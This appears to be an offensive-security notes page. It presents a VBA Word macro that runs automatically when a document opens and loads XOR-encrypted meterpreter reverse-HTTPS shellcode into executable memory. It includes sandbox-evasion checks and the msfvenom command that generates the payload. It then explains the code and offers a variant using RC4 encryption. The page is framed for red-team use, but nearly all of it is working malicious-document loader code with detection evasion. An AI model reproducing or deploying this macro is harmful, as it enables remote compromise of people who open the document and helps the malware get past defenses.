
## Macros

#### XOR encrypted shellcode runner 
- From https://arttoolkit.github.io/wadcoms/ShellcodeRunner-VBA/
```vb
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long

Sub Document_Open()
  ShellcodeRunner
End Sub

Sub AutoOpen()
  ShellcodeRunner
End Sub

Function ShellcodeRunner()
  Dim buf As Variant
  Dim tmp As LongPtr
  Dim addr As LongPtr
  Dim counter As Long
  Dim data As Long
  Dim res As Long
  Dim dream As Integer
  Dim before As Date

  ' Check if we're in a sandbox by calling a rare-emulated API
  If IsNull(FlsAlloc(tmp)) Then
    Exit Function
  End If

  ' Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
  dream = Int((1500 * Rnd) + 2000)
  before = Now()
  Sleep (dream)
  If DateDiff("s", t, Now()) < dream Then
    Exit Function
  End If

  ' msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.240.178 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key a
  buf = Array(31, 33, ..., 33, 37)

  ' XOR-decrypt the shellcode
  For i = 0 To UBound(buf)
    buf(i) = buf(i) Xor Asc("a")
  Next i

  ' &H3000 = 0x3000 = MEM_COMMIT | MEM_RESERVE
  ' &H40 = 0x40 = PAGE_EXECUTE_READWRITE
  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

  For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
  Next counter

  res = CreateThread(0, 0, addr, 0, 0, 0)
End Function
```

This VBA code is designed to execute a shellcode payload in memory as part of a red team or penetration testing scenario. Here's an explanation of how it works, followed by instructions for how you could modify it to use RC4 encryption instead of XOR encryption.

### **Explanation of the Code:**

1. **API Declarations:**
   - `VirtualAlloc`: Allocates memory for the shellcode.
   - `RtlMoveMemory`: Copies the shellcode into the allocated memory.
   - `CreateThread`: Executes the shellcode by creating a new thread.
   - `Sleep`: Suspends the execution of the code for a random amount of time to avoid detection.
   - `FlsAlloc`: An uncommon API call that checks whether the environment is a sandbox, as this API is typically not emulated in sandbox environments.

2. **Functions:**
   - `Document_Open`: This function runs automatically when the document is opened in Word, triggering the shellcode execution via the `ShellcodeRunner` function.
   - `AutoOpen`: Another automatic execution point when the document opens, also triggering `ShellcodeRunner`.

3. **Anti-Sandbox Techniques:**
   - **API Call Check**: The `FlsAlloc` function is called, and if it returns `Null`, the code exits early. This is an anti-sandbox trick because many sandboxes don't properly emulate this API.
   - **Sleep Check**: The code sleeps for a random amount of time (between 2000 and 3500 milliseconds). After sleeping, it checks whether the system fast-forwarded through the sleep (another sign of a sandbox).

4. **Shellcode Decryption:**
   - The `buf` array contains the XOR-encrypted shellcode generated using `msfvenom`.
   - The `For` loop decrypts each byte in the `buf` array using a simple XOR with the ASCII value of the character `"a"`. This is an extremely basic encryption mechanism for obfuscation.

5. **Memory Allocation and Execution:**
   - Memory is allocated for the decrypted shellcode using `VirtualAlloc` with permissions set to execute, read, and write (`PAGE_EXECUTE_READWRITE`).
   - The shellcode is copied to the allocated memory using `RtlMoveMemory`.
   - The shellcode is then executed in a new thread via `CreateThread`.

---

### **Modified Code with RC4 Encryption:**

```vb

Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long

Sub Document_Open()
  ShellcodeRunner
End Sub

Sub AutoOpen()
  ShellcodeRunner
End Sub

Function ShellcodeRunner()
  Dim buf As Variant
  Dim tmp As LongPtr
  Dim addr As LongPtr
  Dim counter As Long
  Dim data As Long
  Dim res As Long
  Dim dream As Integer
  Dim before As Date
  Dim key As String
  Dim decryptedBuf() As Byte

  ' Check if we're in a sandbox by calling a rare-emulated API
  If IsNull(FlsAlloc(tmp)) Then
    Exit Function
  End If

  ' Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
  dream = Int((1500 * Rnd) + 2000)
  before = Now()
  Sleep (dream)
  If DateDiff("s", before, Now()) < dream Then
    Exit Function
  End If

  ' msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.240.178 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt rc4 --encrypt-key "mykey"
  buf = Array(31, 33, ..., 33, 37)

  ' RC4 decryption key (same key used to encrypt the shellcode)
  key = "mykey"

  ' Decrypt the RC4-encrypted shellcode
  decryptedBuf = RC4Decrypt(buf, key)

  ' &H3000 = 0x3000 = MEM_COMMIT | MEM_RESERVE
  ' &H40 = 0x40 = PAGE_EXECUTE_READWRITE
  addr = VirtualAlloc(0, UBound(decryptedBuf), &H3000, &H40)

  For counter = LBound(decryptedBuf) To UBound(decryptedBuf)
    data = decryptedBuf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
  Next counter

  res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

' RC4 decryption function
Function RC4Decrypt(buf As Variant, key As String) As Byte()
    Dim s(255) As Integer
    Dim k(255) As Integer
    Dim i As Integer, j As Integer, t As Integer
    Dim keyLength As Integer
    Dim temp As Integer
    Dim output() As Byte
    Dim bufLength As Integer
    Dim decryptedBuf() As Byte

    ' Initialize the key-scheduling algorithm (KSA)
    keyLength = Len(key)
    For i = 0 To 255
        s(i) = i
        k(i) = Asc(Mid(key, (i Mod keyLength) + 1, 1))
    Next i

    j = 0
    For i = 0 To 255
        j = (j + s(i) + k(i)) Mod 256
        temp = s(i)
        s(i) = s(j)
        s(j) = temp
    Next i

    ' Initialize the output array
    bufLength = UBound(buf) - LBound(buf) + 1
    ReDim decryptedBuf(bufLength)

    ' Decryption using the pseudo-random generation algorithm (PRGA)
    i = 0
    j = 0
    For counter = LBound(buf) To UBound(buf)
        i = (i + 1) Mod 256
        j = (j + s(i)) Mod 256
        temp = s(i)
        s(i) = s(j)
        s(j) = temp
        t = (s(i) + s(j)) Mod 256
        decryptedBuf(counter) = buf(counter) Xor s(t)
    Next counter

    RC4Decrypt = decryptedBuf
End Function
```
